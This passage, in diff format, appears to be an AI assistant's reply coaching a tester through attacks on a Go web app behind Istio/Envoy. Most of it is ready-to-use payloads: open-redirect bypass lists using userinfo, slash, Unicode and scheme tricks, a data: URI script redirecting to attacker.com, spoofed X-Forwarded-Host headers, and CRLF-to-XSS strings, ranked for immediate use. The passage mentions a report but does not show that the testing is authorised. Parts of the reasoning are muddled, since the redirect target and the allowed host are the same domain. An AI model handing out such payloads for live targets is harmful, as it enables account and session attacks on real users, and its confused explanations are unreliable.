@@ -1,0 +1,61 @@
+as a newline — that's confirmed CRLF injection, but Istio/Envoy is stripping it from the headers before they reach the client. So header injection is mitigated at the proxy layer but body injection is live.
+Open Redirect — Blocked by hostname validation: The error message tells you everything:
+URL value "https://google.com</pre>Set-Cookie" does not match 
+the hostname of the current "google.com"
+The Go backend is doing hostname comparison — it extracts the host from your redirect URL and checks it matches the current app's hostname. This is the validation you need to bypass.
+
+Open Redirect Bypass Attempts
+The validator is almost certainly using Go's url.Parse() then comparing .Host — which has well-documented bypasses. Try these in the logout parameter:
+Bypass Group 1 — Credential/userinfo confusion:
+https://victim.com@google.com
+https://victim.com:80@google.com
+https://victim.com%40google.com
+https://victim.com%2540google.com
+Go's url.Parse puts everything before @ as userinfo — the .Host becomes google.com (passes check) but browser navigates to google.com with userinfo victim.com.
+Bypass Group 2 — Slash confusion:
+https:///google.com
+https:////google.com
+\/\/google.com
+/\/google.com
+Bypass Group 3 — Hostname matching tricks:
+https://google.com.attacker.com
+https://google.com%2fattacker.com
+https://google.com%09
+https://google.com%20
+If the validator does strings.HasPrefix(host, allowedHost) instead of exact match — first one wins.
+Bypass Group 4 — Scheme confusion:
+//google.com
+javascript://google.com%0aalert(1)
+data:text/html,<script>location='https://attacker.com'</script>
+Bypass Group 5 — URL fragment/path tricks:
+https://google.com#attacker.com
+https://google.com?.attacker.com
+https://google.com/attacker.com
+Bypass Group 6 — Unicode / encoding:
+https://ɢoogle.com          (Unicode lookalike G)
+https://google%E3%80%82com  (Unicode fullstop instead of .)
+https://google。com          (ideographic full stop)
+Bypass Group 7 — X-Forwarded-Host (already in your request!):
+You already have X-Forwarded-Host: google.com in the request. Try:
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+X-Original-URL: https://attacker.com
+X-Rewrite-URL: https://attacker.com
+If the redirect destination is built from X-Forwarded-Host instead of the request hostname, you get the redirect for free without touching the logout param at all.
+
+On the CRLF — What You Can Still Do
+Even though headers are blocked by Envoy, body CRLF has real impact depending on the content type. Since the response is text/html:
+XSS via CRLF in body — if your newline lands inside a <script> block or attribute:
+logout=https://google.com%0d%0a<script>alert(document.domain)</script>
+logout=https://google.com%0d%0a</pre><img src=x onerror=alert(1)>
+Session fixation via CRLF in body — less likely but worth noting if body gets parsed.
+For the report — even body-only CRLF is reportable as Medium. State that header injection is mitigated by Istio/Envoy but the underlying Go application does not sanitize \r\n — if the proxy layer changes or is misconfigured, it becomes header injection immediately.
+
+Priority Order to Try Right Now
+
+X-Forwarded-Host: attacker.com — lowest effort, highest chance given it's already in the request
+https://victim.com@google.com — classic Go url.Parse userinfo bypass
+//google.com — schemeless redirect
+Unicode lookalike domain
+
+The X-Forwarded-Host one is genuinely your best shot here given Istio is already reading that header for routing decisions.
